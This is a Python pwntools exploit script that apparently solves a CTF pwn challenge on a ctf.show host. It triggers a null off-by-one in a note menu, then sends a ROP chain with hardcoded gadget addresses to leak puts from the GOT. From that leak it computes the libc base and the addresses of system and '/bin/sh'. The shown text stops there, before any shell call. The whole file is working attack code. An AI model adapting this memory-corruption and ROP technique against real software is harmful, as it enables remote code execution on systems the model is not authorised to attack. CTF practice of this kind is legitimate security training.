from pwn import *
    
#io = process('./pwn',env={'LD_PRELOAD':'./libc.so.6'})
io = remote('pwn.challenge.ctf.show',28111)
elf = ELF('./pwn')
libc = ELF('/home/bit/libc/64bit/libc-2.23.so')
pop_rdi = 0x0000000000401083 
pop_rsi = 0x0000000000401081  
pop_rbp = 0x000000000040107f  
pop_rsp = 0x000000000040107d 
puts_got = 0x0000000000601F90
scanf_got = 0x0000000000601FF0
bss = 0x0000000000602800
format_str = 0x0000000000401619
jmp_ptr_rbp = 0x00000000004018ab 
def add(content):
    io.sendlineafter('>','1')
    io.sendlineafter('Note:',content)
    
io.sendlineafter('Input your ID:','bit')
    
payload = 'a'*0xA8 + p64(format_str)
payload = payload.ljust(0x100,'a')
#null off by one
add(payload)
    
payload = 'a'*0x64
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(pop_rbp)
payload += p64(puts_got)
payload += p64(0)*2
payload += p64(jmp_ptr_rbp)
    
payload += p64(pop_rdi)
payload += p64(format_str)
payload += p64(pop_rsi)
payload += p64(bss)
payload += p64(0)
payload += p64(pop_rbp)
payload += p64(scanf_got)
payload += p64(0)*2
payload += p64(jmp_ptr_rbp)
    
payload += p64(pop_rsp)
payload += p64(bss)
    
io.sendlineafter('>',payload)
io.recv(1)
puts = u64(io.recv(6).ljust(8,'\x00'))
libc_base = puts - libc.sym['puts']
system = libc_base + libc.sym['system']
binsh = libc_base + libc.search('/bin/sh').next()
